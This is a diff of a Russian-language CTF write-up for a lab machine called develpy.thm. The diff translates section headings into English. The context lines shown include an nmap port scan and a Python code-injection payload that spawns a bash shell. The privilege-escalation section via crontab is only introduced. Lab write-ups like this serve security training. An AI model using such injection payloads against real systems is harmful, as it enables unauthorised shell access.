@@ -7,7 +7,7 @@
 :white_check_mark: [**crontab**](#crontab)
 ___
 
-## Разведка
+## Enumeration
 Сканируем ip командой:
 ```
 nmap -vv -p 1-10000 develpy.thm
@@ -21,7 +21,7 @@ PORT      STATE SERVICE          REASON
 Read data files from: /usr/bin/../share/nmap                                                         
 ```
 
-<a name="nc"><h2>Получение оболочки</h2></a>
+<a name="nc"><h2>Getting shell</h2></a>
 
 <a name="python"></a>
 
@@ -34,7 +34,7 @@ Read data files from: /usr/bin/../share/nmap
 ```
 __import__("os").system("bash")
 ```
-<a name="crontab"><h2>Повышение привилегий</h2></a>
+<a name="crontab"><h2>Privilege escalation</h2></a>
 
 Посмотрим что находится в crontab.
 
